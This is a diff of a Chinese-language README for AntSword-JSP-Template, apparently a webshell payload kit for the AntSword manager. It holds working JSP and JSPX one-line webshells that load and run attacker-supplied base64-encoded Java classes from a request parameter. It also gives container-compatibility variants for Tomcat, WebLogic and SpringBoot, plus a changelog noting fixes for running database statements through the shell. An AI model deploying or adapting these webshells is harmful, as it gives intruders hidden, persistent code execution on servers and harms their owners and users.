@@ -1,4 +1,4 @@
-# AntSword-JSP-Template  v1.5
+# AntSword-JSP-Template  v1.6
 
 中国蚁剑JSP一句话Payload
 
@@ -76,7 +76,7 @@ shell.jsp
 <%
     String cls = request.getParameter("ant");
     if (cls != null) {
-        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
     }
 %>
 ```
@@ -113,12 +113,28 @@ shell.jspx
     <jsp:scriptlet>
         String cls = request.getParameter("ant");
         if (cls != null) {
-            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
         }
     </jsp:scriptlet>
 </jsp:root>
 ```
-其中`pageContext`可以替换为`request`，以实现对内存Webshell的兼容。
+其中
+
+`new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});`
+
+可以替换为
+
+`new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);`
+
+这种写法支持Tomcat/Weblogic，不支持如SpringBoot等不自带pageContext的容器。
+
+或者
+
+`new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(request);`
+
+这种写法支持Tomcat/SpringBoot/Weblogic等容器。原理是使用反射自动从request中提取出response，遇到比较特殊的容器可能会提取失败。
+
+后两种为不推荐的写法，可能会在未来移除。
 
 ## 解码器
 
@@ -173,10 +189,17 @@ $ base64 -w 0 AsoutputReverse.class
  }
 ```
 
-
 ## 更新日志
 
-### v1.5
+### v 1.6
+
+
+1. equals支持数组传参方式，兼容各种容器
+2. build.py中可以手动指定版本号编译，不再需要下载指定jdk
+3. 部分变量转为类属性，方便调试
+4. 修正 insert/update/delete 语句无法执行问题
+
+### v 1.5
 
 1. 支持解码器(返回包加密)
 2. 修复base64编码问题&改正错别字
